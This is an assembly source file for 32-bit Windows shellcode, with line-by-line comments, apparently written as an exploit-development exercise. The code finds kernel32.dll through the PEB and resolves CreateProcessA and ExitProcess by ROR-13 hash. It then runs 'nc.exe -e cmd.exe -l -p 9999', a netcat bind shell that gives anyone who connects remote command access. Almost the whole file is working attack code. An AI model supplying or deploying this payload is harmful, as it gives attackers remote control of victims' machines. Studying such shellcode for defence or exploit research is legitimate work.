;myshellcode.asm
[section .text]

BITS 32   ;Set the code to be 32-bit. (If I don't have this line,
		  ;the resulting instructions may end up being different to what I were expecting.)

global_start:

_start:
	
	jmp short locate_hash_1  ;To find the constants address from stack
locate_hashes_return:  ;define return label to return to this code
	pop esi	           ;get constants address from stack
	xor eax, eax	   ;clear the eax register
	mov al, 0x5c	   ;make 0x5c space to al for next use
	sub esp, eax	   ;allocate 0x5c space on stack for functions
	mov ebp, esp	   ;use ebp as the frame pointer throughout the code
	mov [ebp + 0x30], esi	  ;store symbol hash address in [ebp+0x30]		

	
	call find_kernel32	;find address of kernel32.dll and store in eax
	mov edx, eax		; move the kernel32.dll address from eax to edx
	
	mov esi, [ebp+0x30]	;put symbols' hash address in esi

;RESOLVE KERNEL32_SYMBOLS:	
	
	lea edi, [ebp + 0x04]	;this is where we store our function addresses
	mov ecx, esi			;move hash address in ecx
	xor eax, eax			;zero the eax register
	mov al, 0x0c			;make 0x0c space to al for next use
	add ecx, eax			;add 0x0c to ecx, this is the length of symbols hash list
	call resolve_symbols_for_dll  ;find the functions' address


;Initialize Process:===========================================

initialize_process:
	xor ecx, ecx			;clear the ecx register
	mov cl, 0x54			;set the low order byte of ecx to 0x54 which will be used to represent
							;the size of the STARTUPINFO and PROCESS_INFORMATION structures on the stack.
	sub esp, ecx			;allocate 0x54 bytes of stack space for the two structures
	mov edi, esp			;set edi to point to the STARTUPINFO structure
zero_structs:
	xor eax, eax			;zero eax for use with stosb to zero out the two structures 
	rep stosb				;repeat storing 0 at the buffer starting at edi until ecx is 0
initialize_structs:
	mov edi, esp			;reset edi to point to the STARTUPINFO structure
	mov byte [edi], 0x44	;set the cb attribute of STARTUPINFO to the size of the structure(0x44)
execute_process:
	lea esi, [edi + 0x44]		;load the address of the PROCESS_INFORMATION structure into esi
	push esi					;push lpProcessInformation
	push edi					;push lpStartupInfo
	push eax					;push lpCurrentDirectory
	push eax					;push lpEnvironment
	push eax					;push dwCreationFlags
	push eax					;push bInheritHandles
	push eax					;push ThreadAttributes
	push eax					;push lpProcessAttribute
	xor ebx, ebx				;zero the ebx for next use
	mov bl, 0x0f				;make 0x0f space which is the length of constant cmd
	add ebx, [ebp+0x30]			;put the address of the constant cmd to ebx
	push ebx					;push lpCommandLine(pointer to cmd)
	push eax					;push lpApplicationName
	call dword [ebp + 0x08]		;call createProcessA
exit_process:
	call dword [ebp + 0x0c]		;call exitProcess
	ret							;return to caller
	
;====================================================


;FUNCTION:resolve symbols for dll=======================

resolve_symbols_for_dll:
	lodsd		;load the current function hash into eax(pointed to by esi), add 0x04 to esi
	push eax	;push the hash to the stack as the second argument to find_function
	push edx	;push the base address of kernel32.dll being loaded from as the first argument
	call find_function	;call find_function to resolve the symbol
	mov [edi], eax	;save the VMA of the function in the memory location atttt edi
	xor eax, eax    ;zero the eax register for next use
	add al, 0x08	;move 0x08 bytes to al for next use
	add esp, eax	;add 8 bytes to the stack for the two arguments(eax, edx)
	sub al, 0x04	;sub al to 4 byte for next use
	add edi, eax	;add 0x04 to edi, make edi available for next function's address output
	cmp esi, ecx	;check to see if esi matches with the boundary for stopping symbol lookup
	jne resolve_symbols_for_dll  ;loop until find match
resolve_symbols_for_dll_finished:
	ret				;return to the caller
	
;END FUNCTION:resolve symbols for dll====================

jmp short locate_hash_1_skip    ;to skip the locate_hash_1
locate_hash_1:
	jmp short locate_hash_2     ;due to jmp short only can jump 128bytes forward or 127bytes afterward,
								;this is used to relay jmp short
locate_hash_1_skip:				;;to skip the locate_hash_1
	
;FUNCTION:find_kernel32 (PEB)==============================
find_kernel32:
	push esi                ;preserve the esi
	xor eax, eax	        ;zero the eax
	mov eax, [fs:eax+0x30]	;store the address of the PEB in eax
	test eax, eax		    ;bitwise compare eax with itself
	js find_kernel32_9x     ;if SF is 1 then it's on win9x, otherwise on NT
find_kernel32_nt:
	mov eax, [eax + 0x0c]	;extract the Module list Pointer to the loader data structure
	mov esi, [eax + 0x1c]	;extract the first entry in the initialization order module list
	lodsd					;grab the next entry in the list which points to kernel32.dll
	mov eax, [eax + 0x8]	;get the module base address and save to eax
	xor ebx, ebx
	jmp find_kernel32_finished ;jump to the end as done
find_kernel32_9x:
	mov eax, [eax + 0x34]   ;store the pointer at offset 0x34 in eax
	lea eax, [eax + 0x7c]	;load the effective address at eax plus 0x7c to keep us 
							;in signed byte range in order to avoid nulls
	mov eax, [eax + 0x3c]	;extract the base address of kernel32.dll
find_kernel32_finished:
	pop esi                 ;Restore esi to its original value
	ret	                    ;return to the caller
;END FUNCTION:find_kernel32===============================


jmp short locate_hash_2_skip         ;skip jmp short
locate_hash_2:
	jmp short locate_symbol_hashs    ;relay jmp short
locate_hash_2_skip:                  


;FUNCTION:find_function(EDT)===========================

find_function:
	pushad					;Preserve all registers except eax, edx which are pushed before
							;to store their original values
	mov ebp, [esp + 0x24]	;put the base address of the module that is being loaded from in ebp
	mov eax, [ebp + 0x3c]	;skip over the MSDOS header to the start of the PE header
	mov edx, [ebp + eax + 0x78]	;the export table is 0x78 bytes from the start of the E header.
								;extract it and start the relative address in edx
	add edx, ebp			;make the the export table address absolute by adding the base address to it
	mov ecx, [edx + 0x18]	;extract the number of exported items
	mov ebx, [edx + 0x20]	;extract the names table relative offset and store it in ebx
	add ebx, ebp			;make the names table address absolute by adding the base address to it
	
;the main process of finding address of the function
find_function_loop:
	jecxz find_function_finished   ;If ecx is zero then the last symbol has been checked and as such jump to 
								   ;the end of the function. If this condition is ever true then the requested
								   ;symbol was not resolved properly.
	dec ecx						;decrement the counter for the loop
	mov esi, [ebx + ecx * 4]	;extract the relative offset of the name associated with the current symbol
								;and store it in esi
	add esi, ebp				;make the address of the symbol name absolute by adding the base address to it
compute_hash:
	xor edi, edi     ;zero edi as it will hold the hash value for the current symbols function name
	xor eax, eax	 ;zero eax in order to ensure that the high order bytes are zero as this will hold the value
					 ;of each character as it walks through the symbol name.
	cld			     ;clear the direction flag(DF) to ensure that it increments instead of decrements when
					 ;using the lods* instructions.
compute_hash_again:
	lodsb			 ;load the byte at esi, the current symbol name, into al and increment esi by 0x01
	test al, al		 ;bitwise test al with itself to see if the end of the string has been reached
	jz compute_hash_finished ;if zero flag is set the end of the string has been reached, then jump to the end.
	ror edi, 0xd	 ;rotate the current value of the hash 13 bits to the right
	add edi, eax     ;add the current character of the symbol name to the hash accumulator
	jmp compute_hash_again ;continue looping through the symbol name
compute_hash_finished:
find_function_compare:
	cmp edi, [esp + 0x28]   ;check to see if the computed hash matches the requested hash.
	jnz find_function_loop  ;if the hashes do not match, continue enumerating the exported symbol list
							;otherwise, drop down and extract the VMA of the symbol
	mov ebx, [edx + 0x24]	;extract the ordinals table relative offset and store it in ebx
	add ebx, ebp			;make the ordinals table address absolute by adding the base address to it
	mov cx, [ebx + 2 * ecx] ;extract the current symbols ordinals number from the ordinal table.
							;ordinals are two bytes in size.
	mov ebx, [edx + 0x1c]	;extract the address table relative offset and store it in ebx
	add ebx, ebp			;make the address table address absolute by adding the base address to it
	mov eax, [ebx + 4 * ecx]  ;extract the relative function offset from its ordinal and store it in eax
	add eax, ebp		;make the function's address absolute
	mov [esp + 0x1c], eax	;Overwrite the stack copy of the preserved eax register so that when popad is finished
							;the appropriate return value will be set.
find_function_finished:
	popad				    ;restore all general-purpose registers.
	ret						;return to the caller

;END FUNCTION:find_function======================

locate_symbol_hashs:   ;This is used to find the constants address from stack
	call dword locate_hashes_return  ;Use to find the constants address from stack
	;LoadLibraryA hash value
    db 0x8e, 0x4e, 0x0e, 0xec  
    ;CreateProcessA hash value (0x08)
    db 0x72, 0xfe, 0xb3, 0x16
    ;ExitProcess hash value (0x0c)
    db 0x7e, 0xd8, 0xe2, 0x73
cmd: db "nc.exe -e cmd.exe -l -p 9999", 0x00 ;This argument is used for CreateProcessA
